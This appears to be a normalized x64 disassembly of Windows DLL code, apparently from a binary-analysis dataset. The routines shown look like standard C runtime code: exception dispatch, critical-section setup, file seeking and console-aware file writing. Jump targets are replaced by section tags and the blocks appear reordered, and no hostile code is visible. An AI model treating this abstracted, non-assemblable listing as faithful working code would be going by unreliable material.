call sub_18000c440
jmp r-xdata
mov rcx [ r12 ]
jmp r-xdata
mov rcx rbx
call sub_18000d350
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
lea rdx [ rsi + 0x8 ]
call sub_180011d4c
mov [ r12 ] rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_180015c98
test eax eax
je r-xdata
sub_18001225c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
test [ r8 ] 0x80000000
je r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
dec eax
jne r-xdata
call sub_180012058
dec eax
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_180011d4c
mov rdx rax
mov rcx rdi
call r10
call sub_18000d350
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_180011d4c
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_18000d350
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_18001230c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_18000d24c
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_18000d338
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xc0 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_18000d7d0
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_18001225c
sub_1800123d0
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
cmp [ rcx ] 0x80000003
mov r14 r9
mov r12 r8
mov r15 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xa8 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_18000f510
mov edi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_18000f510
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d r12d
mov rdx rbp
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_18000d5cc
mov ecx [ rsp + 0xa0 ]
cmp ecx [ rsp + 0x50 ]
jae r-xdata
call sub_180012d48
cmp [ rsi ] 0xe0434f4d
je r-xdata
lea rdi [ rax + 0xc ]
cmp [ rsi ] 0xe0434352
je r-xdata
inc ecx
add rdi 0x14
mov [ rsp + 0xa0 ] ecx
cmp ecx [ rsp + 0x50 ]
jb r-xdata
cmp r12d [ rdi - 0x8 ]
jg r-xdata
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 r12
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx rsi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_18000d578
test eax eax
jne r-xdata
lea r13 [ rdi - 0xc ]
cmp r12d [ r13 ]
jl r-xdata
call sub_18000d338
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_18000d338
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_18000d338
add rax rbx
jmp r-xdata
call sub_18000d338
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_18000d338
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov ecx [ rsp + 0xa0 ]
call sub_18000d338
mov ecx [ rdi ]
mov r8 [ rsp + 0xb0 ]
dec ecx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r13
and [ rsp + 0x30 ] 0x0
movsxd rcx ecx
mov r9 r14
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x4 ]
mov rdx r15
add rcx rax
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_18001230c
xor eax eax
call sub_18000d338
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_18000d338
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_180012608
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3f ]
sub rsp 0x90
mov rbx [ rbp + 0x67 ]
mov r13 rdx
mov rdi rcx
xor r14b r14b
mov rdx r9
mov rcx rbx
mov r15 r9
mov r12 r8
mov [ rbp + 0x47 ] r14b
call sub_180011914
lea r9 [ rbp - 0x21 ]
mov r8 rbx
mov rdx r15
mov rcx r13
mov esi eax
call sub_18000d24c
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_18001198c
mov r8 rbx
mov rdx r15
cmp esi eax
jle r-xdata
mov rcx r13
call sub_18001198c
mov esi eax
lea rcx [ rbp - 0x21 ]
mov r9d esi
call sub_180011944
mov r9d esi
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180011950
jmp r-xdata
call sub_180012d48
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_18000f510
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rbp + 0x6f ] 0x0
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xe8 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_180012d48
call sub_180012d24
mov rax [ rbp + 0x7f ]
mov r9 r15
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rbp + 0x77 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_1800123d0
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_18000f510
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_18000f510
mov rdi [ rax + 0xf0 ]
call sub_18000f510
mov rcx [ rdi + 0x38 ]
mov r12 [ rax + 0xf8 ]
mov [ rbp + 0x57 ] r12
call sub_18000d384
mov edx 0x1
mov rcx rdi
call sub_180015c98
test eax eax
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rbp + 0x77 ]
lea rax [ rbp - 0x31 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x39 ]
mov r9d esi
mov rdx rbx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_18000d5cc
mov ecx [ rbp - 0x39 ]
mov edx [ rbp - 0x31 ]
cmp ecx edx
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_180012d48
mov esi [ rbx + 0x20 ]
test esi esi
je r-xdata
lea r12 [ rax + 0x10 ]
call sub_18000f510
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
xor eax eax
movsxd rsi esi
call sub_18000d338
add rax rsi
jmp r-xdata
inc ecx
add r12 0x14
mov [ rbp - 0x39 ] ecx
cmp ecx edx
jb r-xdata
cmp esi [ r12 - 0xc ]
jg r-xdata
call sub_18000f510
mov r12 [ rax + 0x108 ]
call sub_18000f510
mov rdx r12
and [ rax + 0x108 ] 0x0
mov rcx rdi
call sub_180011d70
test al al
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
test esi esi
je r-xdata
test rax rax
je r-xdata
cmp [ r12 - 0x10 ] esi
jg r-xdata
test r14b r14b
jne r-xdata
call sub_18000d338
movsxd r13 [ r12 ]
mov r14d [ r12 - 0x4 ]
add r13 rax
mov r12 [ rbp + 0x57 ]
xor r13d r13d
cmp [ r12 ] r13d
jle r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
xor edx edx
call sub_18000d338
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rbp + 0x47 ]
mov r13 [ rbp + 0x4f ]
call sub_18000d350
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rbp - 0x29 ] rax
call sub_18000d350
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ecx [ rax + rdx ]
mov [ rbp - 0x35 ] ecx
test ecx ecx
jle r-xdata
call sub_180012d24
xor esi esi
call sub_180012d48
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rbp + 0x47 ]
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_18000d24c
mov cl [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
and [ rsp + 0x20 ] 0x0
mov r9 rax
mov rdx rdi
mov rcx r13
call sub_18000d7d0
mov rcx rdi
call sub_180011d70
test al al
jne r-xdata
dec r14d
add r13 0x14
jmp r-xdata
call sub_18000d350
mov rcx [ rbp - 0x29 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r13
mov rdx rax
mov [ rbp - 0x19 ] rax
call sub_180011a04
test eax eax
jne r-xdata
xor eax eax
call sub_18000d338
movsxd rcx [ r12 + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18000d338
add rax rbx
jmp r-xdata
test r14d r14d
jle r-xdata
mov al [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov r14b 0x1
mov [ rsp + 0x40 ] al
lea rax [ r12 - 0x10 ]
mov r9 r15
mov [ rsp + 0x38 ] rax
mov rax [ rbp - 0x19 ]
mov rcx rdi
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r13
mov r13 [ rbp + 0x4f ]
mov rdx r13
mov [ rbp + 0x47 ] r14b
mov [ rsp + 0x20 ] rbx
call sub_18001230c
jmp r-xdata
mov eax [ rbp - 0x35 ]
add [ rbp - 0x29 ] 0x4
dec eax
mov [ rbp - 0x35 ] eax
test eax eax
jg r-xdata
mov dl 0x1
mov rcx rdi
call sub_180011d08
lea r11 [ r--data ]
lea rdx [ rbp + 0x47 ]
lea rcx [ rbp - 0x11 ]
mov [ rbp + 0x47 ] r11
call sub_18000cff4
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
mov [ rbp - 0x11 ] r11
call sub_18000d1b8
int3
inc r13d
add rsi 0x14
cmp r13d [ r12 ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_18000c0bc
test al al
jne r-xdata
mov edx [ rbp - 0x31 ]
mov ecx [ rbp - 0x39 ]
call sub_18000d338
movsxd rcx [ r12 + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_180012afc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_18000f510
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_180012608
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_18000d338
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_18000d3a0
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_180011888
mov ebx eax
cmp eax 0xffffffff
jl r-xdata
xor r11d r11d
call sub_18000d350
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_180012d48
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_180012d48
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_180011b7c
jmp r-xdata
sub_180012d98
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
xor ebx ebx
mov rdi r12
inc ebx
add rdi 0x10
cmp ebx 0x24
jl r-xdata
movsxd rax esi
mov edx 0xfa0
inc esi
lea rcx [ rax + rax * 4 ]
lea rax [ rw-data ]
lea rcx [ rax + rcx * 8 ]
mov [ rdi ] rcx
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
je r-xdata
cmp [ rdi + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax ebx
add rax rax
and [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
sub_180012e1c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov edi 0x24
lea rbx [ rw-data ]
mov esi edi
add rbx 0x10
dec rsi
jne r-xdata
cmp [ rbx + 0x8 ] 0x1
je r-xdata
mov rbp [ rbx ]
test rbp rbp
je r-xdata
lea rbx [ rw-data ]
mov rcx rbp
call [ DeleteCriticalSection@IAT ]
mov rcx rbp
call sub_18000ec1c
and [ rbx ] 0x0
add rbx 0x10
dec rdi
jne r-xdata
cmp [ rbx ] 0x1
jne r-xdata
mov rcx [ rbx - 0x8 ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call [ DeleteCriticalSection@IAT ]
sub_180012ebc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r13
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r13 [ rw-data ]
cmp [ r13 + rdi * 8 ] 0x0
je r-xdata
call sub_18000f340
lea ecx [ rsi + 0x1d ]
call sub_18000f0e0
mov ecx 0xff
call sub_18000ed4c
mov ecx 0x28
call sub_18000f72c
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_180012fa4
nop
mov rcx rbx
cmp [ r13 + rdi * 8 ] 0x0
jne r-xdata
call sub_18000ea3c
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r13
retn
call sub_18000ec1c
nop
mov edx 0xfa0
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
mov [ r13 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_18000ec1c
call sub_18000ea3c
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
jmp r-xdata
sub_180012fa4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_180012ebc
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_18000f08c
sub_180012fe8
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
mov edi r8d
mov [ rsp + 0x38 ] rdx
mov ecx ebx
call sub_180015d9c
cmp rax 0xffffffffffffffff
jne r-xdata
mov edx [ rsp + 0x38 ]
lea r8 [ rsp + 0x3c ]
mov r9d edi
mov rcx rax
call [ SetFilePointer@IAT ]
mov [ rsp + 0x38 ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
mov rcx rbx
mov rax rbx
lea rdx [ rw-data ]
sar rax 0x5
and ecx 0x1f
mov rax [ rdx + rax * 8 ]
imul rcx rcx 0x58
and [ rax + rcx + 0x8 ] 0xfd
mov rax [ rsp + 0x38 ]
call [ GetLastError@IAT ]
test eax eax
je r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov ecx eax
call sub_18000ea7c
jmp r-xdata
or rax 0xffffffffffffffff
jmp r-xdata
sub_180013080
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x8 ] ecx
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x20
mov esi r8d
mov r12 rdx
movsxd rdi ecx
cmp edi 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
jmp r-xdata
call sub_18000ea5c
and [ rax ] 0x0
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000e9d4
cmp edi [ rw-data ]
jae r-xdata
or rax 0xffffffffffffffff
mov rbx rdi
mov r13 rdi
sar r13 0x5
lea r14 [ rw-data ]
and ebx 0x1f
imul rbx rbx 0x58
mov rax [ r14 + r13 * 8 ]
movsx ecx [ rax + rbx + 0x8 ]
and ecx 0x1
je r-xdata
mov ecx edi
call sub_180015e10
nop
mov rax [ r14 + r13 * 8 ]
test [ rax + rbx + 0x8 ] 0x1
je r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000ea5c
and [ rax ] 0x0
or rbx 0xffffffffffffffff
mov r8d esi
mov rdx r12
mov ecx edi
call sub_180012fe8
mov rbx rax
jmp r-xdata
mov rbx [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov ecx edi
call sub_180015eb8
mov rax rbx
jmp r-xdata
sub_180013164
mov [ rsp + 0x20 ] rbx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x1a30 ]
mov eax 0x1b30
call sub_18000d8d0
sub rsp rax
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x1a20 ] rax
xor edi edi
mov r14d r8d
mov r13 rdx
and [ rsp + 0x44 ] edi
movsxd rbx ecx
test r8d r8d
jne r-xdata
test rdx rdx
jne r-xdata
xor eax eax
jmp r-xdata
mov r15 rbx
mov r12 rbx
lea rax [ rw-data ]
sar r12 0x5
and r15d 0x1f
mov rcx [ rax + r12 * 8 ]
mov [ rsp + 0x50 ] r12
imul r15 r15 0x58
mov sil [ r15 + rcx + 0x38 ]
mov [ rsp + 0x60 ] r15
add sil sil
sar sil 0x1
cmp sil 0x2
je r-xdata
call sub_18000ea5c
and [ rax ] edi
call sub_18000ea3c
mov [ rax ] 0x16
call sub_18000e9d4
mov rcx [ rbp + 0x1a20 ]
xor rcx rsp
call sub_18000c060
mov rbx [ rsp + 0x1b88 ]
add rsp 0x1b30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov eax r14d
not eax
test al 0x1
je r-xdata
cmp sil 0x1
jne r-xdata
test [ r15 + rcx + 0x8 ] 0x20
je r-xdata
mov ecx ebx
call sub_1800139f8
test eax eax
je r-xdata
xor edx edx
mov ecx ebx
lea r8d [ rdx + 0x2 ]
call sub_180012fe8
lea rax [ rw-data ]
mov rcx [ rax + r12 * 8 ]
test [ r15 + rcx + 0x8 ] 0x80
je r-xdata
lea rax [ rw-data ]
mov rax [ rax + r12 * 8 ]
test [ r15 + rax + 0x8 ] 0x80
je r-xdata
mov rcx [ r15 + rcx ]
and [ rsp + 0x20 ] rdi
lea r9 [ rsp + 0x48 ]
mov r8d r14d
mov rdx r13
call [ WriteFile@IAT ]
test eax eax
je r-xdata
xor ebx ebx
mov r12 r13
test sil sil
jne r-xdata
call sub_18000f510
xor ebx ebx
lea rdx [ rsp + 0x5c ]
mov rcx [ rax + 0xc0 ]
lea rax [ rw-data ]
cmp [ rcx + 0x14 ] ebx
mov rcx [ rax + r12 * 8 ]
mov rcx [ r15 + rcx ]
sete bl
call [ GetConsoleMode@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
mov edi [ rsp + 0x48 ]
xor ebx ebx
jmp r-xdata
cmp sil 0x2
jne r-xdata
test r14d r14d
je r-xdata
test ebx ebx
je r-xdata
test edi edi
jne r-xdata
test r14d r14d
je r-xdata
test r14d r14d
je r-xdata
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rax [ rcx + rax * 8 ]
test [ r15 + rax + 0x8 ] 0x40
je r-xdata
lea edx [ rbx + 0xd ]
call [ GetConsoleCP@IAT ]
and [ rsp + 0x58 ] edi
mov rbx r13
mov [ rsp + 0x5c ] eax
test r14d r14d
je r-xdata
test sil sil
je r-xdata
sub edi [ rsp + 0x44 ]
mov eax edi
test ebx ebx
je r-xdata
mov r8d 0xd
mov edx 0xd
call sub_18000ea3c
mov [ rax ] 0x1c
call sub_18000ea5c
and [ rax ] 0x0
jmp r-xdata
cmp [ r13 ] 0x1a
je r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
mov al [ r12 ]
inc r12
cmp al 0xa
jne r-xdata
mov ebx [ rsp + 0x4c ]
jmp r-xdata
test sil sil
jne r-xdata
cmp ebx 0x5
jne r-xdata
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
lea rax [ rsp + 0x70 ]
sub ecx eax
lea r8 [ rsp + 0x70 ]
mov [ rsp + 0x28 ] 0xd55
mov eax ecx
mov ecx 0xfde9
cdq
sub eax edx
xor edx edx
sar eax 0x1
mov r9d eax
lea rax [ rbp + 0x620 ]
mov [ rsp + 0x20 ] rax
call [ WideCharToMultiByte@IAT ]
mov r15d eax
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
and [ rsp + 0x20 ] rbx
lea rax [ rbp + 0x620 ]
mov r8d esi
sub r8d eax
mov rax [ rsp + 0x50 ]
lea rcx [ rw-data ]
mov rcx [ rcx + rax * 8 ]
mov [ rsp + 0x44 ] r15d
mov r15 [ rsp + 0x60 ]
mov rcx [ r15 + rcx ]
lea r9 [ rsp + 0x48 ]
lea rdx [ rbp + 0x620 ]
call [ WriteFile@IAT ]
test eax eax
je r-xdata
movzx eax [ r12 ]
add r12 0x2
cmp ax 0xa
jne r-xdata
or eax 0xffffffff
jmp r-xdata
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
inc rcx
mov [ rsi ] al
inc rsi
cmp rcx 0x13ff
jb r-xdata
mov [ rsi ] dl
inc r15d
inc rsi
inc rcx
cmp sil 0x1
je r-xdata
mov cl [ rbx ]
xor eax eax
cmp cl 0xa
sete al
mov [ rsp + 0x4c ] eax
lea rax [ rw-data ]
mov rdx [ rax + r12 * 8 ]
cmp [ r15 + rdx + 0x50 ] 0x0
je r-xdata
mov ecx ebx
call sub_18000ea7c
jmp r-xdata
call sub_18000ea3c
mov [ rax ] 0x9
call sub_18000ea5c
mov [ rax ] ebx
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
jmp r-xdata
xor esi esi
add rdx 0x2
mov [ rcx ] ax
add rcx 0x2
cmp rdx 0x6a8
jb r-xdata
mov [ rcx ] r8w
add rcx 0x2
add rdx 0x2
add edi [ rsp + 0x48 ]
lea rax [ rbp + 0x620 ]
sub rsi rax
movsxd rax [ rsp + 0x48 ]
cmp rax rsi
jl r-xdata
add rcx 0x2
mov [ rsi ] ax
add rsi 0x2
cmp rcx 0x13fe
jb r-xdata
mov [ rsi ] dx
add r15d 0x2
add rsi 0x2
